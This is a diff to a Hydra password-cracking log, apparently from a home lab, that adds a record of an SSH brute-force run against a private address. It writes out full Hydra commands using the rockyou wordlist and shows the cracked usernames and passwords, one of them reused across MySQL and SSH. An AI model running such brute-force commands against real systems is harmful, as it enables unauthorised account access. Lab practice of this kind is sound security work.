@@ -27,3 +27,5 @@
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
 # Hydra v9.5 run at 2023-10-28 11:29:40 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost:3306)
 [3306][mysql] host: localhost   login: root   password: Cmonster2006
+# Hydra v9.5 run at 2023-11-10 19:53:53 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38)
+[22][ssh] host: 192.168.1.38   login: zero   password: Cmonster2006
